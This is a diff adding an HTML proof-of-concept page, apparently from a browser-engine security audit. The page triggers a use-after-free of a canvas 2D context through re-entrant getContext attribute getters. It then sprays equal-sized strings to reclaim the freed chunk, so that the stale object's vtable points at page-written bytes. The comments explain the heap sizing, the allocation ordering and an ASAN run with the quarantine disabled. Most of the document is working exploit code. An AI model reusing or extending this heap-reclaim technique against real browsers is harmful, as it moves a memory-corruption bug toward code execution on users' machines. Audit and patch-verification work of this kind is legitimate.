@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>uaf-canvas-reclaim: reclaim the freed CanvasRenderingContext2D with page data</title>
+<!--
+  Follow-up to uaf-canvas.html (audit item #15).
+
+  The freed object is a plain 584-byte WTF::fastMalloc allocation: the ASAN
+  report for uaf-canvas.html names the region size and both stacks
+  (CanvasRenderingContext2D::create -> fastMalloc, ~CanvasRenderingContext2D ->
+  fastFree under HTMLCanvasElement::createContext2d).  It is not an ISO-heap
+  allocation, so a same-size allocation can reuse it.
+
+  Ordering matters and is the point of this page.  HTMLCanvasElement::getContext
+  evaluates createContext2d() first and only then assigns to m_context, so the
+  outer context is allocated BEFORE the inner one is freed.  JS therefore
+  regains control with the 584-byte chunk on the free list, and whatever the page
+  allocates next gets first refusal on it.
+
+  A 567-character 8-bit string is sizeof(StringImpl) + 567 + 1 = 584 bytes: 16
+  bytes of StringImpl header (refcount 1, length 567 = 0x237) followed by
+  character data the page chooses.  Nothing at all is logged between the free
+  and the spray, because `document.title = ...` itself allocates CSS rule
+  vectors of exactly this size and would win the chunk first (that is what the
+  first, verbose version of this page measured).
+
+  Run with the quarantine off so the allocator can hand the chunk back:
+
+    ASAN_EXTRA="quarantine_size_mb=0:thread_local_quarantine_size_kb=0" \
+      ./run.sh ./harness-v19 uaf-canvas-reclaim.html 15000
+
+  Interpreting the result:
+
+    * SEGV on 0x0000000100000237 -> the stale wrapper's vtable slot now holds
+      the StringImpl header (refcount 1, length 0x237).
+    * SEGV on 0x4141414141414141 -> it now holds string data ('A' fill).
+
+  Either is a pointer this page wrote.  On the fixed engine (040ef6e21ffa)
+  there is no stale wrapper: the re-entrant call returns the same context.
+-->
+<script>
+const qs = new URLSearchParams(location.search);
+const LEN = Number(qs.get("len") || 567);      // 584 - sizeof(StringImpl) - 1
+const COUNT = Number(qs.get("count") || 256);
+
+function log(m) {
+  document.title = m;
+  if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.log) {
+    try { window.webkit.messageHandlers.log.postMessage(m); } catch (e) {}
+  }
+  try { console.log(m); } catch (e) {}
+}
+
+let canvas = document.createElement("canvas");
+canvas.width = 64;
+canvas.height = 64;
+
+let innerCtx = null;
+let reentered = false;
+
+function reenterFrom(member) {
+  if (reentered)
+    return;
+  reentered = true;
+  innerCtx = canvas.getContext("2d");
+}
+
+let outerCtx = canvas.getContext("2d", {
+  get desynchronized() { reenterFrom("desynchronized"); return false; },
+  get willReadFrequently() { reenterFrom("willReadFrequently"); return false; },
+  get alpha() { reenterFrom("alpha"); return true; },
+  get colorSpace() { reenterFrom("colorSpace"); return "srgb"; }
+});
+
+let stale = innerCtx;
+
+// ---------------------------------------------------------------------------
+// Nothing that touches the DOM between here and the end of the spray.
+// ---------------------------------------------------------------------------
+let spray = [];
+if (stale) {
+  let body = "";
+  for (let i = 0; i < LEN - 1; ++i)
+    body += "A";
+  for (let i = 0; i < COUNT; ++i)
+    spray.push(body + (i % 10));   // constant length, all-0x41 bodies
+  window.__spray = spray;          // pin them against the GC
+}
+
+// The stale wrapper, if reclaimed, now points into our string bytes.
+let result = "";
+if (!stale) {
+  result = "no stale wrapper (fixed engine?), nothing to do";
+} else {
+  result = "outer=" + (outerCtx ? "a context" : "null") +
+           " inner=" + (innerCtx ? "a context" : "null") +
+           " same=" + (outerCtx === innerCtx) +
+           " sprayed=" + spray.length + " x " + LEN + " chars";
+  try {
+    stale.fillRect(0, 0, 8, 8);
+    result += " | stale.fillRect() returned without trapping";
+  } catch (e) {
+    result += " | stale.fillRect() threw: " + e;
+  }
+  try {
+    result += " | stale.canvas.width = " + stale.canvas.width;
+  } catch (e) {
+    result += " | stale.canvas threw: " + e;
+  }
+  result += " | survived";
+}
+log(result);
+</script>
